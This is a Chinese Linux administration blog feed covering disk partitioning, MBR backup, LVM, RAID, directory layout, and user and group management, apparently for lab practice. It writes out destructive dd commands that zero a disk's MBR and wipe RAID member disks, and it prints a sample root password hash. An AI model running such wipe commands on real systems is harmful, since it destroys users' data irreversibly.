        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux之磁盘管理</title>
      <link href="/2020/12/09/linux-zhi-ci-pan-guan-li/"/>
      <url>/2020/12/09/linux-zhi-ci-pan-guan-li/</url>
      
        <content type="html"><![CDATA[<h1 id="磁盘分区"><a href="#磁盘分区" class="headerlink" title="磁盘分区"></a>磁盘分区</h1><h2 id="0x01-磁盘基础"><a href="#0x01-磁盘基础" class="headerlink" title="0x01 磁盘基础"></a>0x01 磁盘基础</h2><ol><li><p><strong>磁盘</strong>：真实的存储介质，新加的磁盘需要进行分区、格式化、挂载后才能正常使用。</p></li><li><p>Linux里磁盘的命名规则：</p><ul><li>常见的硬盘接口是SATA和SCSI硬盘，以sd开头；</li><li>用字母来表示第几个磁盘，a表示第一块；b是第二块……</li><li>用数字来表示第几个分区，1表示第一个分区……<br><code>/dev/sda1</code>：第一块磁盘的第一分区<br><code>/dev/sdb4</code>：第二块磁盘的第四分区<br><code>/dev/sdd5</code>：第四块磁盘的第一逻辑分区</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/DiskManager/磁盘命名规则.png" alt="磁盘命名规则"></center></li><li><p><strong>文件系统</strong>：告诉硬盘用什么样的方式来存储数据。</p><p>常用的文件系统：</p><ul><li>Windows：Fat16、Fat32、NTFS</li><li>Linux：ext2、ext3、ext4（Centos6）、xfs（Centos7）</li></ul></li></ol><h2 id="0x02-分区规则"><a href="#0x02-分区规则" class="headerlink" title="0x02 分区规则"></a>0x02 分区规则</h2><ol><li><p>磁盘分区规则</p><ul><li>一个磁盘不能超过4个主分区；</li><li>一个磁盘的主分区+扩展分区不能超过4个；<ul><li>主分区和扩展分区的编号是1-4</li></ul></li><li>一个磁盘只能有1个扩展分区；</li><li>扩展分区不能直接存储数据，必须在扩展分区的基础上划分逻辑分区。<ul><li>逻辑分区的编号是从5开始。</li></ul></li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/DiskManager/磁盘分区规则.png" alt="磁盘分区规则"></center></li><li><p>系统简单启动过程</p><ol><li>BIOS自检（CPU、内存、硬盘）</li><li>MBR（主分区引导记录）：磁盘的分区表信息；操作系统的存储位置。大小是512Byte，给分区表的大小是64Byte，其中每个分区占用16Byte。  </li><li>引导分区：/boot（系统启动需要的引导文件）  </li><li>进入操作系统。</li></ol></li></ol><ol start="3"><li><p>MBR查看步骤</p><pre class=" language-shell"><code class="language-shell">#1.MBR介绍:（1）    其中446字节（主引导程序，负责从活动分区中找到操作系统所在位置）；（2）    剩下的64字节（磁盘分区表信息；每16Byte表示一个主分区）用来存放分区信息，只能存放4个主分区；最大支持2T硬盘；（3）    其余2Byte表示MBR的结束符（以AA55结束分区标识）。#2.备份MBR内容dd  if=/dev/sda   of=/test/mbr.txt  bs=512  count=1 file    mbr.txt   #查看文件编码格式,MBR使用的是16进制方式hexdump mbr.txt   #hexdump是用16进制方式查看文件#3.破坏MBR内容dd if=/dev/zero   of=/dev/sda   bs=512  count=1   #把0全写入到分区表#4.还原MBRdd  if=/tmp/mbr.txt   of=/dev/sda     #把备份的MBR分区还原到磁盘</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/DiskManager/MBR主分区.png" alt="MBR主分区"></center><ol start="4"><li><p>另外一种分区格式:GPT</p><pre class=" language-shell"><code class="language-shell">#可以支持大于2T的硬盘，创建128个主分区（对应新的BIOS——UEFI），分区命令用parted</code></pre></li></ol></li></ol><h2 id="0x03-磁盘分区"><a href="#0x03-磁盘分区" class="headerlink" title="0x03 磁盘分区"></a>0x03 磁盘分区</h2><ol><li><p>添加磁盘</p><pre class=" language-shell"><code class="language-shell">#第一步：给虚拟机添加磁盘，把磁盘文件放到虚拟机的安装目录里。#第二步：重启虚拟机，来识别这个新的硬盘。# 查看新加的磁盘ls  /dev/sd*</code></pre></li><li><p>磁盘使用过程</p><pre class=" language-shell"><code class="language-shell">##一般新的硬盘需要几步才能进行数据存储？#第一步：分区——规划格局fdisk  /dev/sdbp(打印分区表)m（查看帮助）n(创建分区)——>p(主分区)/e(扩展分区)——>1（编号）——>指定分区大小的时候用+100Md——>1  表示删除第一个分区  w——>    保存并退出q——>    不保存退出------------------------------------------------------------#第二步：格式化——装修文件系统：数据的存储方式。常见的文件系统格式（ext4、fat32、swap）第一个分区（100M）——fat32（t-1-b）第二个分区（200M）——ext4第三个分区（300M）——swap(t-3-82)mkfs.vfat -F 32 /dev/sdb1  #格式化为fat32mkfs.ext4 /dev/sdb2   #格式化为ext4mkswap /dev/sdb3    #格式化为swap# 将sdb1分区格式化为xfs文件系统mkfs -t xfs /dev/sdb1mkfs.xfs /dev/sdb1free  -h    #查看内存的命令swapon /dev/sdb3   #启用交换分区（1.5—1.8G）swapoff /dev/sdb3    #关闭swap分区---------------------------------------------------------------#第三步：挂载——安装门窗#挂载：给外部设备（分区）进入操作系统的一个入口。#这个入口就是一个“挂载点”（目录）。mkdir /test/fat32   #创建挂载点mkdir /test/ext4    #创建第二个分区的挂载点mount  /dev/sdb1  /test/fat32 mount  /dev/sdb2  /test/ext4/ # 挂载IOS文件mount -o loop /dev/CentOS-7.5-x86_64-DVD-1804.iso /media# 永久挂载vim /etc/fstab/dev/sdb1    /media    Xfs    Defaults    0    0    # 设备名称# 挂载点# 文件系统类型# 挂载参数# 文件系统是否dump备份  # 1表示需要  # 0表示不需要# 系统启动时检查磁盘的顺序 # 0:不检查 # 1:检查(根分区) # 2:其次检查(其他分区)# 卸载文件系统umount /dev/sr0=umount /dev/media=umount /dev/sr0 /media# 查看磁盘使用情况df -Th # -T:显示文件系统类型# -h:以友好的单位来显示-------------------------------------------------------------#第四步:测试,在每个挂载点进行读写,看是否正常echo  '111111'  >> /test/fat32/1.txtecho  '222222'  >> /test/ext4/2.txt  </code></pre></li></ol><h2 id="0x04-parted分区"><a href="#0x04-parted分区" class="headerlink" title="0x04 parted分区"></a>0x04 parted分区</h2><ol><li><p>怎么恢复磁盘为初始状态?</p><pre class=" language-shell"><code class="language-shell">#第一步：卸载；关闭swap里调用的分区。swapoff /dev/sdb3   #关闭swap新的空间umount   /dev/sdb1umount   /dev/sdb2#第二步：删除分区fdisk /dev/sdbd——>1；   #表示删除第一个分区d——>2；d——>3——>w；  #w保持sync   #同步磁盘信息</code></pre></li></ol><ol start="2"><li><p>parted分区:针对2T以上的磁盘可以进行分区。</p><pre class=" language-shell"><code class="language-shell">#第一步:添加一个1G硬盘：parted /dev/sdb print   //查看分区信息 #第二步：创建分区用Parted  mkpartparted /dev/sdb mkpart  primary  ext4  0  100    ignore   //创建主分区，文件系统是ext4；分区从0开始从100M结束；ignore表示忽略parted /dev/sdb mkpartfs primary fat32 101 300 ignore   //创建第二个主分区为fat32格式；parted  /dev/sdb    mkpart  primary  linux-swap  301  600  ignore#其他参考参数：parted  /dev/sdb    mkpart  logical  ext4  8193  100GB    ignoreparted  /dev/sdb    mkpart  logical  ext4  101GB  3000GB  ignore    parted  /dev/sdb    quit#第三步：格式化mkfs -t ext4 /dev/sda3#第四步：挂载mount  /dev/sda3 /home#想删除分区：先卸载；#然后执行parted  /dev/sdc  rm  2  //删除sdc上的第2个分区</code></pre></li></ol><h1 id="LVM逻辑卷管理"><a href="#LVM逻辑卷管理" class="headerlink" title="LVM逻辑卷管理"></a>LVM逻辑卷管理</h1><h2 id="0x01-LVM基础"><a href="#0x01-LVM基础" class="headerlink" title="0x01 LVM基础"></a>0x01 LVM基础</h2><p><strong>LVM的概念</strong>：</p><p>​        LVM（逻辑卷管理），可以动态调整磁盘分区的大小，当某个分区的数据即将存满时，普通分区无法动态调整原分区大小，也不能实现跨磁盘存储，但是LVM可以。LVM与Window中的扩展卷很像。</p><p><strong>LVM的基本术语</strong></p><ul><li><p>PV（physical volume物理卷）</p><ul><li><p>物理卷是LVM的基本存储设备.</p></li><li><p>创建物理卷时会在分区或是磁盘的头部创建一个保留区块,用于记录LVM的属性,    并把存储空间逻辑分割成默认4MB大小的基本单元（PE）从而构成物理卷</p></li><li><p>将普通分区<code>/dev/sdb1</code>转成物理卷是需要先将分区类型ID改为8e</p></li></ul></li><li><p>VG（volume group 卷组）</p><ul><li><p>卷组是一个或多个物理卷的集合</p></li><li><p>在卷组内可以动态添加或是删除物理卷</p></li><li><p>卷组的名字可以自定义</p></li></ul></li><li><p>LV（logical volume 逻辑卷）</p><ul><li><p>逻辑卷是在卷组上逻辑划分的卷,与物理卷没有关系</p></li><li><p>将逻辑卷的空间安装文件系统,挂载到挂载点就可以使用,相当于普通分区</p></li></ul></li></ul><p><strong>LVM层级关系:</strong></p><ul><li><p>LV用多少取多少—————LVM（逻辑卷）</p></li><li><p>PE收集和管理物资————VG（卷组）</p></li><li><p>VG每个人能拿出来物资——PV（物理卷）</p></li><li><p>PV原始物资——物理磁盘</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/DiskManager/LVM示意图.png" alt="LVM示意图"></center></li></ul><p><strong>普通分区和逻辑分区的创建使用过程对比:</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/DiskManager/普通分区.png" alt="普通分区"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/DiskManager/LVM分区.png" alt="LVM分区"></center><h2 id="0x02-LVM管理"><a href="#0x02-LVM管理" class="headerlink" title="0x02 LVM管理"></a>0x02 LVM管理</h2><p>LVM中常用命令：</p><table><thead><tr><th>功能</th><th>物理卷管理</th><th>卷组管理</th><th>逻辑卷管理</th></tr></thead><tbody><tr><td>Scan 扫描</td><td>pvscan</td><td>vgscan</td><td>lvscan</td></tr><tr><td>Create 建立</td><td>pvcreate</td><td>vgcreate</td><td>lvcreate</td></tr><tr><td>Display 显示</td><td>pvdisplay</td><td>vgdisplay</td><td>lvdisplay</td></tr><tr><td>Remove 删除</td><td>pvremove</td><td>vgremove</td><td>lvremove</td></tr><tr><td>Extend 扩展</td><td></td><td>vgextend</td><td>lvextend</td></tr><tr><td>Reduce 减少</td><td></td><td>vgreduce</td><td>lvreduce</td></tr></tbody></table><p>LVM管理命令：</p><pre class=" language-shell"><code class="language-shell">rpm -qa | grep lvm  #确认系统是否安装LVM包#第一步：添加3个1G的硬盘ls  /dev/sd*  #如果有/dev/sdb;/dev/sdc;/dev/sdd正确#第二步：创建PVpvcreate /dev/sd[bcd]   #创建pvpvs   #检查pv是否成功#第三步：创建VGvgcreate vg_test /dev/sd[bcd]  #vg名字叫vg_test，给sdb/sdc/sdd三个磁盘创建VGvgs  #检查vg#第四步：创建LVM#-L指定LVM大小；-n表示LVM的名称；后边vg_test是把LVM和VG做一个关联。lvcreate -L 2.98G -n lvm_test vg_test   lvs   #检查LVM#第五步：格式化mkfs.xfs  /dev/vg_test/lvm_test #第六步：挂载mkdir /test/lvm_test   #创建lvm的挂载点mount /dev/vg_test/lvm_test   /test/lvm_test/# 查看挂载的LVdf -h   #大小3G/dev/mapper/vg_test-lvm_test 2.9G  4.5M  2.8G   1% /test/lvm_test#第七步：如果之前的空间不够用——扩容。pvcreate /dev/sde  #添加一个1G的硬盘vgextend vg_test /dev/sde   #把第5个磁盘扩展VGlvextend -L  +0.98G /dev/vg_test/lvm_test    #扩展LVM，增加1Gresize2fs /dev/vg_test/lvm_test    #给之前的LVM新增加的空间进行格式化 lvreduce -L 2G /dev/vg_test/lvm_test   #减少LVM的大小（减少2G）history   #检查之前的文件：cat  /test/lvm_test/6.txt e2fsck -f /dev/vg_test/lvm_test   #查看LVM的详细信息# 第八步：先卸载umount /test/lvm_test/  lvremove /dev/vg_test/lvm_test  #移除LVM信息vgremove vg_test   #移除vg卷组pvremove /dev/sd[bcde]   #移除pv# 初始化磁盘fdisk /dev/sdb-d                        # 删除分区</code></pre><h1 id="RAID卷管理"><a href="#RAID卷管理" class="headerlink" title="RAID卷管理"></a>RAID卷管理</h1><h2 id="0x01-RAID基础"><a href="#0x01-RAID基础" class="headerlink" title="0x01 RAID基础"></a>0x01 RAID基础</h2><p>磁盘阵列（<code>Redundant Arrays of Independent Disks</code>,<em><code>RAID</code></em>） :有多块磁盘组成的一个磁盘组，具有提升读写速度和数据冗余的能力。</p><ul><li>Raid分为硬Raid（基于硬件Raid卡）和软Raid（基于系统）<ul><li>磁盘分为基本磁盘和动态磁盘，因为基本磁盘分区大小不能调整，一旦数据丢失，很难恢复。所以就有了动态磁盘</li><li>卷是动态磁盘的最基本形式。简单卷，跨区卷，</li><li>Raid0:又叫做带区卷，读写速度是原来的N倍，磁盘利用率是100%，但是不具备容错能力。</li><li>Raid1：叫做镜像卷，读写速度是原来的一半，磁盘利用率为50%，具备容错能力。</li><li>raid5卷：由3-32块大小相同的磁盘组成，读写速度是原来的N倍，磁盘利用率为（n-1）/n</li></ul></li></ul><h2 id="0x02-RAID管理"><a href="#0x02-RAID管理" class="headerlink" title="0x02 RAID管理"></a>0x02 RAID管理</h2><ol><li><p>创建RAID。</p><pre class=" language-shell"><code class="language-shell">#1.给虚拟机再添加4个硬盘（1G/个）#2.创建raid5 -C表示创建虚拟磁盘；-l创建的Raid级别；-n表示由几个硬盘组成； mdadm -C /dev/raid5 -l 5 -n 3 /dev/sd[bcd]  mdadm -D /dev/md5    #-D显示详细信息#3.格式化mkfs.ext4 /dev/md5#4.挂载，并进行读写测试mount /dev/md5 /mntdf  -h   #检查挂载是否成功echo  7777777777 >> /mnt/7.txtcat /mnt/7.txt #5.模拟一个磁盘坏掉mdadm /dev/md5 -f /dev/sdb   #-f(fail)指定错误磁盘mdadm /dev/md5 -r /dev/sdb    #-r(remove)移除mdadm -D /dev/md5   #6.添加一个新的磁盘mdadm /dev/md5 -a  /dev/sdb  #-a(add)表示把新磁盘添加到Raid5里。说明:这里标记错误和添加的新硬盘编号最好一样,否则容易出错.cat /proc/mdstat   #查看Raid信息#7.Raid5 的信息默认重启会失效mdadm -Ds >> /etc/mdadm.conf   #把raid5的相关信息写入mdadm的配置文件里#内容：  ARRAY   /dev/md0  UUID=XXXXX#8.写入开机自动挂载的配置文件里vim  /etc/fstab  /dev/md5  /mnt   ext4    defaults    0 0 </code></pre></li><li><p>清空RAID。</p><pre class=" language-shell"><code class="language-shell">#1.第一步:(如果有)编辑vim  /etc/fstab  去掉/dev/md5 这一行#2.第二步:卸载raid5umount  /dev/md5     #卸载rm -rf /etc/mdadm.conf    #删除mdadm的配置文件mdadm -D /dev/md5   #检查md5这个组里的磁盘编号（最后3行）#注意：删除的时候一定要注意磁盘编号；dd命令不要覆盖到错误的磁盘里。#3.第三步:标记要移出的磁盘为错误,并停止raid5mdadm  /dev/md5 -f /dev/sd[bcd]  #标记错误mdadm  /dev/md5 -r /dev/sd[bcd]  #移除cat /proc/mdstat      #检查系统里识别的Raid信息mdadm  -S /dev/md5    #-S表示停止raid5.#4.覆盖掉存储在磁盘里的Raid信息dd if=/dev/zero of=/dev/md5 bs=100M    count=1   #覆盖掉系统识别的raid信息#根据之前查看mdadm -D  /dev/md5里的磁盘编号进行覆盖（不要dd执行在错误的磁盘编号上）。dd if=/dev/zero of=/dev/sdb bs=100M    count=1  dd if=/dev/zero of=/dev/sdc bs=100M    count=1  dd if=/dev/zero of=/dev/sdd bs=100M    count=1  reboot    #重启生效 </code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux目录介绍</title>
      <link href="/2020/12/08/linux-mu-lu-jie-shao/"/>
      <url>/2020/12/08/linux-mu-lu-jie-shao/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th align="center">目录</th><th align="center">介绍</th></tr></thead><tbody><tr><td align="center">/bin</td><td align="center">一般用户可用，启动时会用到的命令，即在文件系统还未挂载时也能够使用的命令</td></tr><tr><td align="center">/boot</td><td align="center">主要放置开机会使用到的文件，包括Linux核心文件以及开机菜单与开机所需配置文件等等</td></tr><tr><td align="center">/dev</td><td align="center">任何设备与周边设备都是以文件的形态存在于这个目录</td></tr><tr><td align="center">/etc</td><td align="center">系统主要的配置文件几乎都放置在这个目录内</td></tr><tr><td align="center">/lib</td><td align="center">放置在开机时会用到的函数库，以及在/bin或/sbin下面的指令会调用的函数库</td></tr><tr><td align="center">/media</td><td align="center">放置可移除的设备，包括软盘、光盘、DVD等设备都暂时挂载于此</td></tr><tr><td align="center">/mnt</td><td align="center">暂时挂载某些额外的设备，与/media用途相同</td></tr><tr><td align="center">/opt</td><td align="center">放置第三方软件文件</td></tr><tr><td align="center">/run</td><td align="center">放置系统开机后所产生的各项信息</td></tr><tr><td align="center">/sbin</td><td align="center">放置开机过程中所需要的二进制文件，里面包括开机、修复、还原系统等用来设置系统环境的指令，这些指令只能root才能使用</td></tr><tr><td align="center">/srv</td><td align="center">存放服务进程所需的数据文件和一些服务的执行脚本</td></tr><tr><td align="center">/tmp</td><td align="center">让一般使用者或正在执行的成暂时放置文件的地方</td></tr><tr><td align="center">/usr</td><td align="center">用于存储只读用户数据的第二层次；包含绝大数的用户工具和应用程序</td></tr><tr><td align="center">/var</td><td align="center">变量文件，在正常运行的系统中其内容不断变化的文件，如日志、脱机文件和临时电子邮件文件等</td></tr><tr><td align="center">/home</td><td align="center">用户家目录</td></tr><tr><td align="center">/lib64</td><td align="center">支持64位的函数库</td></tr><tr><td align="center">/root</td><td align="center">root用户家目录</td></tr><tr><td align="center">/lost+found</td><td align="center">当文件系统发生错误时，将一些遗失的片段放置到这个目录下</td></tr><tr><td align="center">/proc</td><td align="center">该目录本身是一个虚拟文件系统，其中的数据都在内存中，例如：系统核心、进程信息、周边设备的状态即网络状态等等</td></tr><tr><td align="center">/sys</td><td align="center">该目录本身是一个虚拟文件系统，主要也是记录核心与系统硬件信息相关的信息。包括目前已载入的核心模块与核心侦测到的硬件设备信息等等</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux之用户和组管理</title>
      <link href="/2020/12/08/linux-zhi-yong-hu-he-zu-guan-li/"/>
      <url>/2020/12/08/linux-zhi-yong-hu-he-zu-guan-li/</url>
      
        <content type="html"><![CDATA[<h1 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h1><h2 id="0x01-用户分类"><a href="#0x01-用户分类" class="headerlink" title="0x01 用户分类"></a>0x01 用户分类</h2><ul><li><strong>超级用户</strong>：<code>root（uid=gid=0）</code>，拥有系统最高权限（<code>administrator+system</code>）</li><li><strong>普通用户</strong>：拥有登录操作系统的权限和一部分管理权限。<br>用户<code>uid</code>在<code>Centos6</code>之前是从<code>500</code>开始；<code>Centos7</code>之后是从<code>1000</code>开始。</li><li><strong>虚拟用户</strong>：只有运行服务的一些权限，不能登录操作系统。<br><code>centos6</code>之前用户<code>uid</code>从<code>1-499</code>;<code>centos7</code>之后是<code>1-999</code>;</li><li>注：<ul><li>一个用户在创建的时候，会创建一个默认的同名组。</li><li>一个用户只能属于一个<strong>基本组</strong>，但可以同时属于多个<strong>附加组</strong>——权限具有累加性。</li></ul></li></ul><h2 id="0x02-查看用户"><a href="#0x02-查看用户" class="headerlink" title="0x02 查看用户"></a>0x02 查看用户</h2><ul><li>查看你<code>uid</code>和<code>gid</code>信息：</li></ul><pre class=" language-shell"><code class="language-shell">id  [username]   #查看用户的uid+gide.g.:# Show uid and gid of Current Useriduid=0(root) gid=0(root) 组=0(root)id grimuid=1000(grim) gid=1000(grim) 组=1000(grim)##查看登录用户whomai  #显示当前用户who     #显示登录用户w         #显示登录用户和相应进程 finger    #查看用户账户的登录属性</code></pre><ul><li>查看<code>passwd</code>文件内容：</li></ul><pre class=" language-shell"><code class="language-shell">[root@centos-3 test]# cat /etc/passwd    //账号存储路径root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologin----字段1：用户名字段2：密码占位符   //为了安全，存在另外的文件中/etc/shadow字段3：uid 用户唯一标识字段4：gid 组标识字段5：用户的基本信息（全名，地址，邮件，电话）字段6：用户的家目录字段7：用户登录的shell环境（命令解释器：用户输入命令->shell—>内核->调用硬件）    /bin/bash 表示可以登录shell    /sbin/nologin 表示用户无法登录系统    ls /bin|grep sh$   #查看当前系统支持的shell---</code></pre><ul><li>查看<code>shadow</code>文件内容：</li></ul><pre class=" language-shell"><code class="language-shell">root:$6$MIcqh4RspmpYzhNM$sjbXKMH08x9W754nTzJdvajqzP1B5SHeGM26l5msUVh0hlXB9YmeIblK8Ka7PR5R.hSNggmVRXvN5PbUYbLuQ0::0:99999:7:::bin:*:15980:0:99999:7:::daemon:*:15980:0:99999:7:::---字段1：用户名字段2：sha-512加密后的密码字段3：最后一次修改密码的时间，距离1970年1月1日的时间字段4：密码的最短使用时间，0表示没有限制字段5：密码的最长使用期限，默认为99999表示为不限制字段6：表示失效7天之前提醒用户字段7：密码的非活跃期，密码失效几天之后给用户修改密码的时间字段8：失效时间，到期用户不能再登录，为空表示用户永久可用字段9：未定义---##了解：修改用户密码时间的命令chage的基本格式：chage [参数] 用户</code></pre><h2 id="0x02-添加用户"><a href="#0x02-添加用户" class="headerlink" title="0x02 添加用户"></a>0x02 添加用户</h2><p><code>useradd</code>命令用于创建新的用户，命令格式为：<code>useradd [参数] 用户名</code></p><p><strong>常用参数</strong>：</p><table><thead><tr><th align="center">参数</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center"><code>-u</code></td><td align="center">指定该用户的默认的UID值</td></tr><tr><td align="center"><code>-g</code></td><td align="center">指定一个初始的用户基本组（必须已存在）</td></tr><tr><td align="center"><code>-d</code></td><td align="center">指定用户的家目录（默认为<code>/home/username</code>）</td></tr><tr><td align="center"><code>-s</code></td><td align="center">指定该用户默认的Shell解释器（是否允许用户登录系统）</td></tr><tr><td align="center"><code>-e</code></td><td align="center">账户的到期时间，格式为<code>YYYY-MM-DD</code></td></tr><tr><td align="center"><code>-G</code></td><td align="center">添加一个或多个扩展组</td></tr><tr><td align="center"><code>-M</code></td><td align="center">不创建用户的主目录</td></tr><tr><td align="center"><code>-N</code></td><td align="center">不创建与用户名同名的基本组</td></tr><tr><td align="center"><code>-D</code></td><td align="center">查看添加用户时的默认设置</td></tr></tbody></table><p><strong>常用示例</strong>：</p><pre class=" language-shell"><code class="language-shell"># 创建一个用户aaa,同时会创建一个同名组useradd aaa    # 创建一个www虚拟用户，不允许登录操作系统(-s)，不创建家目录(-M)useradd -s /sbin/nologin -M www# 创建一个用户ccc，同时指定uid=gin=666 注意：给用户指定某个组id时，要保证这个gid是存在的。 groupadd  666    #创建一个名字666的组 groupmod -g 666 666   #指定666的组的gid为666 useradd -u 666 -g 666 ccc   #添加一个用户ccc，uid=gid=666</code></pre><h2 id="0x03-修改用户"><a href="#0x03-修改用户" class="headerlink" title="0x03 修改用户"></a>0x03 修改用户</h2><p><code>usermod</code>：修改已存在用户账户属性</p><p><strong>常用参数</strong>：</p><table><thead><tr><th align="center">参数</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center"><code>-l</code></td><td align="center">修改用户名</td></tr><tr><td align="center"><code>-u</code></td><td align="center">修改用户的<code>uid</code></td></tr><tr><td align="center"><code>-g</code></td><td align="center">修改用户的<code>gid</code></td></tr><tr><td align="center"><code>-d</code></td><td align="center">修改用户的宿主目录</td></tr><tr><td align="center"><code>-e</code></td><td align="center">修改用户账户的失效时间</td></tr><tr><td align="center"><code>-s</code></td><td align="center">指定用户登录的shell</td></tr><tr><td align="center"><code>-G</code></td><td align="center">修改用户的附加组</td></tr></tbody></table><p><strong>常用示例</strong>：</p><pre class=" language-shell"><code class="language-shell">##案例:当家目录不存在时怎么解决#修改aaa的家目录为/test/aaa/，检查/etc/passwd家目录是否修改成功#切换到用户aaa，查看是否正常。-bash-4.1$ pwd     #说明:出现-bash-4.1证明用户的家目录里没有环境变量##解决方法：1.更换家目录usermod -d /test/aaa/ aaa #root权限；修改aaa的家目录为/home/a2.把家目录下的.bash*相关的3个文件复制到新的家目录下。cp /home/aaa/.bash* /test/aaa/   #root权限执行报错处理：usermod -d /home/aaa aaa    #命令正确，但是aaa呗进程usermod: user aaa is currently used by process 3652kill -9 3652       #杀掉进程；-9强制杀死# 创建caiwubu和jishubu，把ccc加入到两个附加组里 usermod -G jishubu,caiwubu ccc   #-G指定附加组# 指定ccc的基本组为ccc  usermod -g ccc（组名） ccc（用户名）   #-g修改ccc的基本组为ccc</code></pre><p><code>passwd</code>：给用户设置密码（默认给当前用户设置密码）</p><p><strong>常用参数</strong>：</p><table><thead><tr><th align="center">参数</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center"><code>-d</code></td><td align="center">将密码置空</td></tr><tr><td align="center"><code>-l</code></td><td align="center">锁定用户</td></tr><tr><td align="center"><code>-u</code></td><td align="center">解锁用户</td></tr><tr><td align="center"><code>-S</code></td><td align="center">查看用户状态</td></tr><tr><td align="center"><code>--stdin</code></td><td align="center">取消交互式设置密码</td></tr></tbody></table><p><strong>常用示例</strong>：</p><pre class=" language-shell"><code class="language-shell"># 清除demo用户的密码passwd -d demo# 锁定demo用户passwd -l demo# 查看demo用户的状态passwd -S demo# 解锁demo用户的状态passwd -u demo#给ddd设置密码为123456echo "123456" | passwd --stdin aaa  </code></pre><h2 id="0x04-删除用户"><a href="#0x04-删除用户" class="headerlink" title="0x04 删除用户"></a>0x04 删除用户</h2><pre class=" language-shell"><code class="language-shell">##删除用户：userdel liming    //删掉用户，保存了家目录userdel -r liming   //删除用户和他的家目录（一起删除）</code></pre><h2 id="0x05-用户的初始化配置文件"><a href="#0x05-用户的初始化配置文件" class="headerlink" title="0x05 用户的初始化配置文件"></a>0x05 用户的初始化配置文件</h2><p>添加一个用户后，useradd命令会在该用户的宿主目录中建立一些初始配置文件，这些文件都是隐藏的。</p><p>文件包括三个：</p><ul><li><code>.bash_profile</code> ：文件中的命令将会在用户<strong>每次登录时被执行</strong>。</li><li><code>.bash_bashrc</code>  ：文件中的命令将会在每次<strong>加载bash时候执行</strong>。</li><li><code>.bash_logout</code> ：文件中的命令将会在每次<strong>退出登录时执行</strong>。</li></ul><p>注：</p><ul><li><code>etc</code>目录下也有<code>bashrc</code>这个文件,这里面的文件是面对所有用户（全局配置）</li><li>当用户登录后会在用户的家目录中创建一个名为<code>.bash_history</code>的文件其中存储的信息为该用户输入过的历史命令</li></ul><h1 id="组管理"><a href="#组管理" class="headerlink" title="组管理"></a>组管理</h1><h2 id="0x01-查看组"><a href="#0x01-查看组" class="headerlink" title="0x01 查看组"></a>0x01 查看组</h2><ol><li><p>用户组相关信息</p><pre class=" language-shell"><code class="language-shell">cat /etc/group ：存储的是用户组的相关信息*****root:x:0:           #说明：字段4如果为空，表示组成员跟组同名bin:x:1:bin,daemon    字段1：组名字段2：x表示组密码的占位符字段3：组ID字段4：用户的组成员信息e.g.:# 以root开头的组信息grep "^root" /etc/group</code></pre></li><li><p>组密码相关信息</p><pre class=" language-shell"><code class="language-shell">cat /etc/gshadow   //查看组密码保存文件caiwubu:!::ccc第一列：组账号信息第二列：组密码第三列：组管理员第四列：组成员信息（一般基本成员不显示，只显示附加成员）</code></pre></li><li><p>查询用户账户所属的组</p><pre class=" language-shell"><code class="language-shell"># 查看用户账户所属的组groups e.g.:groups demo</code></pre></li></ol><h2 id="0x02-添加组"><a href="#0x02-添加组" class="headerlink" title="0x02 添加组"></a>0x02 添加组</h2><pre class=" language-shell"><code class="language-shell">groupadd test（组名）     //创建test组groupadd -g 1500 test    //创建test组并将test组的gid设置为1500gpasswd -a demo root    // 将demo添加到root组</code></pre><h2 id="0x03-修改组"><a href="#0x03-修改组" class="headerlink" title="0x03 修改组"></a>0x03 修改组</h2><pre class=" language-shell"><code class="language-shell"># 将demo添加到root组gpasswd -a demo root    # 将demo从root组中删除gpasswd -d demo root# 将demo,test设置成jishubu组的成员，命令执行之后jishubu组中只剩下demo和test两个用户(jishubu必须存在)gpasswd -M demo,test jishubu</code></pre><h2 id="0x04-删除组"><a href="#0x04-删除组" class="headerlink" title="0x04 删除组"></a>0x04 删除组</h2><pre><code># 删除jishubu组（注意：删除组的时候，要保证这个组不是基本组）groupdel [组名]# 删除jishubu组groupdel jishubu</code></pre><h1 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h1><h2 id="0x01-文件类型"><a href="#0x01-文件类型" class="headerlink" title="0x01 文件类型"></a>0x01 文件类型</h2><ol><li><p>文件颜色和文件分类的关系</p><pre class=" language-shell"><code class="language-shell">白色——普通文件蓝色——目录绿色——可执行文件，比如命令或者脚本（/sbin下）  举例：ls -l /etc/rc.local浅蓝色——符号链接文件（快捷方式） 黄色——设备文件红色——压缩文件</code></pre></li><li><p>常见的文件类型标识符</p><pre class=" language-shell"><code class="language-shell">-:普通文件d:目录l:链接文件（ln  -s 源文件  新的快捷方式；分为软连接和硬链接）c：字符设备文件b:设备文件里面的可供存储的周边设备</code></pre></li></ol><h2 id="0x02-文件属性解析"><a href="#0x02-文件属性解析" class="headerlink" title="0x02 文件属性解析"></a>0x02 文件属性解析</h2><ol><li><p>查看文件属性命令:  <code>ls -lhi</code></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/UserAndGroup/文件属性.png" alt="文件属性"></center></li><li><p>文件属性解析:</p><pre class=" language-shell"><code class="language-shell">（1）格式化：告诉磁盘（硬盘、U盘等）使用什么方式来存储数据。（2）存储数据的方式叫做“文件系统”。 Windows里常见的文件系统：fat16、fat32、ntfs 